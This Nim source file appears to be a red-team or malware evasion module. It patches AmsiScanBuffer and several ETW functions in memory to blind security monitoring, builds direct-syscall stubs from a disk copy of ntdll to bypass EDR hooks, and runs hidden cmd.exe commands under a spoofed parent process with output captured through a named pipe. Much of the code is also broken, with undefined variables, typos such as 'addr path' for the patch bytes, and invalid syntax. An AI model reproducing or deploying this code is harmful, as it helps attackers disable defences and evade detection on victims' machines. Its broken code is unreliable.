import winim
import std/strutils
import os, json, strformat, strutils
import times, random
import sequtils

#prcedural types
#prcedural types
type customNtAllocateVirtualMemory = proc(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    ZeroBits: ULONG,
    RegionSize: PSIZE_T,
    AllocationType: ULONG,
    Protect: ULONG
): NTSTATUS {.stdcall.}

type customNtWriteVirtualMemory = proc(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    Buffer: PVOID,
    NumberOfBytesToWrite: ULONG,
    NumberOfBytesWritten: PULONG
): NTSTATUS {.stdcall.}

type customNtCreateThreadEx = proc(
    ThreadHandle: PHANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: POBJECT_ATTRIBUTES,
    ProcessHandle: HANDLE,
    StartRoutine: PVOID,
    Argument: PVOID,
    CreateFlags: ULONG,
    ZeroBits: SIZE_T,
    StackSize: SIZE_T,
    MaximumStackSize: SIZE_T,
    AttributeList: PVOID
): NTSTATUS {.stdcall.}

type customNtCreateNamedPipeFile = proc(
    FileHandle: PHANDLE,
    DesiredAccess: ULONG,
    ObjectAttributes: POBJECT_ATTRIBUTES,
    IoStatusBlock: PIO_STATUS_BLOCK,
    ShareAccess: ULONG,
    CreateDisposition: ULONG,
    CreateOptions: ULONG,
    NamedPipeType: ULONG,
    ReadMode: ULONG,
    CompletionMode: ULONG,
    MaximumInstances: ULONG,
    InboundQuota: ULONG,
    OutboundQuota: ULONG,
    DefaultTimeout: PLARGE_INTEGER
): NTSTATUS {.stdcall.}

type customNtCreateProcess = proc(
    ProcessHandle: HANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: PCOBJECT_ATTRIBUTES,
    ParentProcess: HANDLE,
    InheritObjectTable: BOOLEAN,
    SectionHandle: HANDLE,
    DebugPort: HANDLE,
    TokenHandle: HANDLE
): NTSTATUS {.stdcall.}


#functions
proc PatchAMSI*() =
    let size = 6
    var oldProtect: DWORD
    let patch: array[6, byte] = [
    0xB8'u8, 0x57, 0x00, 0x07, 0x80, 0xC3
    ]

    let amsi = LoadLibraryA("amsi.dll")
    if cast[uint](amsi) == 0:
        return
    let amsiscanbuffer = GetProcAddress(amsi,"AmsiScanBuffer")
    if cast[uint](amsiscanbuffer) == 0:
        return

    if VirtualProtect(amsiscanbuffer,size,PAGE_EXECUTE_WRITECOPY, addr oldProtect) != 0:
        copyMem(amsiscanbuffer,addr path,size)
        discard VirtualProtect(amsiscanbuffer,size,oldProtect, addr oldProtect)
    echo "AMSI funtion activated and done!"
    
proc PathETW*() =
    let etwFuncs = [
      "EtwEventWrite",
      "EtwEventWriteEx",
      "EtwEventWriteFull",
      "EtwEventWriteString",
      "EtwEventWriteTransfer",
      "EtwEventActivityIdControl"
    ]
    let patch : array(1,byte) = [0xC3]
    let oldProtect : DWORD
    let size = 1
    let ntdll = GetModuleHandleA("ntdll.dll")
    if cast[uint](ntdll) == 0:
        return
    
    for f in etwFuncs:
        let function = GetProcAddress(ntdll,f)
        if cast[uint](function) == 0:
            continue
        if VirtualProtect(function,size,PAGE_EXECUTE_WRITECOPY,addr oldProtect) != 0:
            copyMem(function, addr path, size)
            discard VirtualProtect(function,size,oldProtect,addr oldProtect)
    
    echo "AMSI funtion activated and done!"
    
proc RVAtoRAW(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
    return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)

proc SectionFinder(rva: DWORD, ntHeader: PIMAGE_NT_HEADERS, fileData: DWORD_PTR): DWORD_PTR =
    var section = IMAGE_FIRST_SECTION(ntHeader)
    for i in 0 ..< ntHeader.FileHeader.NumberOfSections.int:
        if rva >= section.VirtualAddress and rva < (section.VirtualAddress + section.Misc.VirtualSize):
            return cast[DWORD_PTR](section)
        section = cast[PIMAGE_SECTION_HEADER](cast[uint](section) + IMAGE_SIZEOF_SECTION_HEADER.uint)
    return 0

proc GetSyscallStub(function_name: LPCSTR, syscall_stub: LPVOID): BOOL=
    var
        file: HANDLE
        fileSize: DWORD
        bytesRead: DWORD
        fileData: LPVOID
        ntdllString: LPCSTR = "C:\\windows\\system32\\ntdll.dll"
        nullHandle: HANDLE
    
    file = CreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
    fileSize = GetFileSize(file, nil)
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
    ReadFile(file, fileData, fileSize, addr bytesRead, nil)
    
    var dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
    var ntHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData)+dosHeader.e_lfanew)
    var exportDirRVA: DWORD = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    
    if exportDirRVA == 0:
        echo "exportDirRva is empty"
        return false
    
    var rdatasection: PIMAGE_SECTION_HEADER = cast[PIMAGE_SECTION_HEADER](SectionFinder(exportDirRVA,ntHeader,cast[DWORD_PTR](fileData)))
    var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRAW(cast[DWORD_PTR](exportDirRVA)+cast[DWORD_PTR](fileData),rdatasection)) 
    var addressOfNames: PDWORD = cast[PDWORD](RVAtoRAW(cast[DWORD_PTR](exportDirectory.AddressOfNames) + cast[DWORD_PTR](fileData),rdatasection))
    var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRAW(cast[DWORD_PTR](exportDirectory.AddressOfFunctions)+cast[DWORD_PTR](fileData),rdatasection))
    var addressOfNameOrdinals: PDWORD = cast[PDWORD](RVAtoRAW(cast[DWORD_PTR](exportDirectory.AddressOfNameOrdinals)+cast[DWORD_PTR](fileData),rdatasection))
    
    var stubFound: BOOL = 0

    let nameArray = cast[ptr UncheckedArray[DWORD]](addressOfNames)
    let functionArray = cast[ptr UncheckedArray[DWORD]](addressOfFunctions)
    let ordinalArray = cast[ptr UncheckedArray[uint16]](addressOfNameOrdinals)

    for function in 0 ..< exportDirectory.NumberOfNames:
        var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRAW(cast[DWORD_PTR](fileData)+ nameArray[function],rdatasection))
        var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
        var compare: int = lstrcmpA(functionNameResolved,function_name)
        if (compare == 0):
            var functionOrdinal :DWORD = cast[DWORD](ordinalArray[function])
            var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRAW(cast[DWORD_PTR](fileData)+functionArray[functionOrdinal],rdatasection))
            copyMem(syscall_stub,cast[LPVOID](functionVA),23)
            stubFound = 1
            CloseHandle(file)
            HeapFree(GetProcessHeap(), 0, fileData)
            return stubFound
    
    CloseHandle(file)
    HeapFree(GetProcessHeap(), 0, fileData)
    return stubFound

#here i didnt implement the functions within array method,
#since the os itself will create multiple reagion in memory
#where each stubs will be stored.
proc makeNtAllocateVirtualMemory*() =
    var oldProtect: DWORD
    var stub : LPVOID = VirtualAlloc(NULL,cast[SIZE_T](23),(MEM_RESERVE or MEM_COMMIT),PAGE_READWRITE)
    discard GetSyscallStub("NtAllocateVirtualMemory",stub)
    if stub == nil:
        echo "NtAllocateVirtualMemory not found"
        return
    else:
        VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
        let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](stub)

proc makeNtWriteVirtualMemory*() =
    var oldProtect: DWORD
    var stub : LPVOID = VirtualAlloc(NULL,cast[SIZE_T](23),MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE)
    discard GetSyscallStub("NtWriteVirtualMemory",stub)
    if (stub == nil):
        echo "NtWriteVirtualMemory not found"
        return
    else:
        VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
        myNtWriteVirtualMemory = cast[customNtWriteVirtualMemory](stub)

proc makeNtCreateThreadEx*() =
    var oldProtect: DWORD
    var stub: LPVOID = VirtualAlloc(NULL,cast[SIZE_T](23),MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE)
    discard GetSyscallStub("NtCreateThreadEx",stub)
    if (stub == nil):
        echo "NtCreateThreadEx not found"
        return
    else:
        VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
        myNtCreateThreadEx = cast[customNtCreateThreadEx](stub)

proc makeNtCreateNamedPipeFile*() =
    var oldProtect: DWORD
    var stub: LPVOID = VirtualAlloc(NULL,cast[SIZE_T](23),MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE)
    discard GetSyscallStub("NtCreateNamedPipeFile",stub)
    if (stub == nil):
        echo "NtCreateNamedPipeFile not found"
        return
    else:
        VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
        myNtCreateNamedPipeFile = cast[customNtCreateNamedPipeFile](stub)
    
proc makeNtCreateProcess*() =
    var oldProtect: DWORD
    var stub: LPVOID = VirtualAlloc(NULL,cast[SIZE_T](23),MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE)
    discard GetSyscallStub("NtCreateProcess",stub)
    if (stub == nil):
        echo "NtCreateProcess not found"
        return
    else:
        VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
        myNtCreateProcess = cast[customNtCreateProcess](stub)


proc NamePipeCreator(): tuple[serverHandle: HANDLE, clientHandle: HANDLE] =
    let lpstr_pipe_name: LPSTR = r"\\.\pipe\8392841234lal"
    
    echo "[*] Entered NamePipeCreator"
    let pipeNameStr = newWideCString(r"\\.\pipe\8392841234lal")

    # server handle
    var server_pipe_handle = CreateNamedPipeA(
        lpstr_pipe_name,
        PIPE_ACCESS_INBOUND,  #read
        PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        4096,  # outbound 
        4096,  # inbound 
        0,     # default timeout
        nil
    )
    
    if server_pipe_handle == INVALID_HANDLE_VALUE:
        echo "[-] CreateNamedPipeA failed: ", GetLastError()
        return (0, 0)
    
    echo "[+] Server pipe created: ", server_pipe_handle.toHex()
    
    #client handle
    var saAttr: SECURITY_ATTRIBUTES
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
    saAttr.bInheritHandle = 1  # Child MUST inherit this
    saAttr.lpSecurityDescriptor = NULL

    var client_pipe_handle = CreateFileW(
        pipeNameStr,
        GENERIC_WRITE,
        0,
        addr saAttr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        0
    )

    if client_pipe_handle == INVALID_HANDLE_VALUE:
        echo "[-] Client handle creation failed: ", GetLastError()
        CloseHandle(server_pipe_handle)
        return (0, 0)
    
    echo "[+] Client pipe created: ", client_pipe_handle.toHex()
    return (server_pipe_handle, client_pipe_handle)


proc ReadPipe(pipe_handle: HANDLE): =
    var buffer: array[4096, char]
    var bytesRead: DWORD
    var totalBytes: int = 0
    
    echo "[*] Starting to read from pipe..."
    
    while true:
        # Read from pipe
        let readResult = ReadFile(pipe_handle, addr buffer[0], 4096, addr bytesRead, NULL)
        
        if readResult == 0:
            let err = GetLastError()
            if err == 109:  # ERROR_BROKEN_PIPE - child process exited
                echo "[*] Pipe closed (child process finished)"
                break
            else:
                echo "[-] ReadFile error: ", err
                return false
        
        if bytesRead == 0:
            # No more data available, but pipe still open
            echo "[*] No more data in pipe"
            break
        
        # Print the data
        totalBytes += bytesRead.int
        var output = newString(bytesRead)
        copyMem(addr output[0], addr buffer[0], bytesRead)
        stdout.write(output)
        stdout.flushFile()

    
    echo ""
    echo "[+] Total bytes read: ", totalBytes
    return output

proc execProcess*(cmd: string): string =
    echo "enter the parent process id :"
    var pid: DWORD = parseInt(readLine(stdin)).DWORD
    echo "=".repeat(60)
    echo "Selected PID is : ",pid
    echo "=".repeat(60)
    var size: SIZE_T
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION
    command = "cmd.exe /c "&cmd
    echo "[*] === Starting Command Execution ==="
    echo "[*] Command: ", command
    echo ""
    
    echo "[*] Step 1: Creating named pipes..."
    let (server_pipe_handle, client_pipe_handle) = NamePipeCreator()
    
    if server_pipe_handle == 0 or client_pipe_handle == 0:
        echo "[-] Failed to create pipes"
        return ""
    
    echo "[+] Pipes created successfully"
    echo ""

    echo "[*] Step 2: Initializing process attributes..."
    discard InitializeProcThreadAttributeList(NULL, 1, 0, addr size)
    var lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](alloc0(size))
    discard InitializeProcThreadAttributeList(lpAttributeList, 1, 0, addr size)
    
    var parent_process_handle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
    if parent_process_handle == 0:
        let error = GetLastError()
        echo "[-] Failed to open parent process"
        echo "[-] Error Code : ",error
        CloseHandle(server_pipe_handle)
        CloseHandle(client_pipe_handle)
        return ""
    else :
        echo "[+] Successfully Opened the Parent process"

    if UpdateProcThreadAttribute(
        lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        addr parent_process_handle,
        sizeof(HANDLE),
        NULL,
        NULL
    ) == 0:
        echo "[-] UpdateProcThreadAttribute failed: ", GetLastError()
        CloseHandle(server_pipe_handle)
        CloseHandle(client_pipe_handle)
        CloseHandle(parent_process_handle)
        return ""
    
    echo "[+] Process attributes configured"
    echo ""

    # Setup STARTUPINFOEX
    si.lpAttributeList = lpAttributeList
    si.StartupInfo.cb = sizeof(STARTUPINFOEX).int32
    si.StartupInfo.hStdOutput = client_pipe_handle  # Child writes here
    si.StartupInfo.hStdError = client_pipe_handle   # Child writes here
    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES
    si.StartupInfo.wShowWindow = SW_HIDE

    echo "[*] Step 3: Creating child process..."
    
    let success = CreateProcessW(
        NULL,
        newWideCString(command),
        NULL,
        NULL,
        TRUE,  # bInheritHandles = TRUE (CRITICAL!)
        EXTENDED_STARTUPINFO_PRESENT or CREATE_NO_WINDOW,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    )

    if success == 0:
        let err = GetLastError()
        echo "[-] CreateProcess failed: ", err
        CloseHandle(server_pipe_handle)
        CloseHandle(client_pipe_handle)
        CloseHandle(parent_process_handle)
        DeleteProcThreadAttributeList(lpAttributeList)
        dealloc(lpAttributeList)
        return ""
    
    echo "[+] Child process created!"
    echo "    PID: ", pi.dwProcessId
    echo ""
    
    # CRITICAL: Close client handle in parent immediately!
    # Child has its own inherited copy
    CloseHandle(client_pipe_handle)
    echo "[*] Closed client handle in parent (child has its own copy)"
    echo ""
    
    # Now read from server handle
    echo "[*] Step 4: Reading command output..."
    echo "=" .repeat(50)
    var output = ReadPipe(server_pipe_handle)
    echo "=" .repeat(50)
    echo ""
    
    # Wait for child process to finish
    echo "[*] Step 5: Waiting for child process to exit..."
    WaitForSingleObject(pi.hProcess, INFINITE)
    
    var exitCode: DWORD
    GetExitCodeProcess(pi.hProcess, addr exitCode)
    echo "[+] Child process exited with code: ", exitCode
    echo ""
    
    # Cleanup
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    CloseHandle(server_pipe_handle)
    CloseHandle(parent_process_handle)
    DeleteProcThreadAttributeList(lpAttributeList)
    dealloc(lpAttributeList)
    
    echo "[+] === Execution Complete ==="
    echo output
    return output
